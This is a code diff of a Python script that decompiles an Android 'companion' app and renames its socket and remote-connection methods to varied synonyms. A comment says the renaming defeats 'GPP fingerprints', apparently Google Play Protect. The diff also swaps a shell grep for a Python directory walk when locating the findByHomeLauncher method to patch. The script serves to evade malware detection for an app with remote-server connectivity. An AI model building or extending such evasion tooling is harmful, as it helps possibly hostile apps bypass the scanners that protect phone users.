@@ -1537,7 +1537,8 @@ def step_6d_rename_methods(new_pkg: str) -> int:
     # Known custom method names in companion that GPP fingerprints
     # NEVER rename Android framework methods (onCreate, onBind, onStartCommand etc.)
     CUSTOM_METHOD_RENAMES = {
-        "findByHomeLauncher":     ["resolveInstalledLauncher","findActiveLauncherPackage","detectCurrentLauncher","locateHomeLauncherApp"],
+        # findByHomeLauncher removed — step_7 patches this method specifically
+        # Renaming it breaks companion uninstall flow (StartupActivity.uninstallApp calls it)
         "initSocket":             ["initializeNetworkConnection","setupRemoteConnection","establishSocketChannel","prepareNetworkChannel"],
         "connectSocket":          ["connectRemoteServer","establishServerConnection","openNetworkChannel","startRemoteConnection"],
         "disconnectSocket":       ["closeNetworkChannel","terminateServerConnection","shutdownRemoteConnection","endNetworkSession"],
@@ -1593,11 +1594,18 @@ def step_6d_rename_methods(new_pkg: str) -> int:
 
 def step_patch_home_launcher():
     print("\n── Step 7: Patch findByHomeLauncher — add FLAG_SYSTEM check")
-    result = subprocess.run(
-        'grep -rl "findByHomeLauncher" companion_decompiled/smali/ | head -1',
-        shell=True, capture_output=True, text=True
-    )
-    target_file = result.stdout.strip()
+    target_file = ""
+    for _root7, _dirs7, _files7 in os.walk("companion_decompiled/smali"):
+        for _fname7 in _files7:
+            if not _fname7.endswith(".smali"): continue
+            _fpath7 = os.path.join(_root7, _fname7)
+            try:
+                with open(_fpath7, "r", encoding="utf-8", errors="replace") as _f7:
+                    if "findByHomeLauncher" in _f7.read():
+                        target_file = _fpath7
+                        break
+            except Exception: pass
+        if target_file: break
     if not target_file:
         print("[X] findByHomeLauncher not found in any smali file")
         sys.exit(1)
